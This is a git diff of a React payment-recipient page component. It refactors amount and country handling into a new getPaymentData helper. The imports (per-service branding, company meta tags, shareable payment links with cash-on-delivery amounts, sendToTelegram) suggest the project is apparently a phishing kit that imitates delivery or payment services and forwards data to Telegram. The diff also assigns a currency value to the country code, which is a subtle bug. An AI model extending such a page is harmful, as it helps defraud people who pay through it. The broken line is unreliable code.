@@ -10,6 +10,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
+import { getPaymentData } from "@/utils/paymentData";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -45,33 +46,22 @@ const PaymentRecipient = () => {
 
   const shippingInfo = linkData?.payload as any;
 
+  // Extract payment data dynamically
+  const paymentInfo = getPaymentData(linkData);
+  
   // Get payer type from shipping info (default to "recipient" for backward compatibility)
   const payerType = shippingInfo?.payer_type || "recipient";
 
-  // Get country from link data (must be before using currency functions)
-  const countryCode = shippingInfo?.selectedCountry || "SA";
+  // Get country from link data
+  const countryCode = paymentInfo.currency;
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
 
-  // Use currency from URL parameter if available, otherwise from country data
+  // Use currency from URL parameter if available, otherwise from payment data
   const currencyCode = currencyParam || countryData?.currency || "SAR";
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
-
+  // Use dynamic amount
+  const amount = paymentInfo.amount;
   const formattedAmount = formatCurrency(amount, currencyCode);
 
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
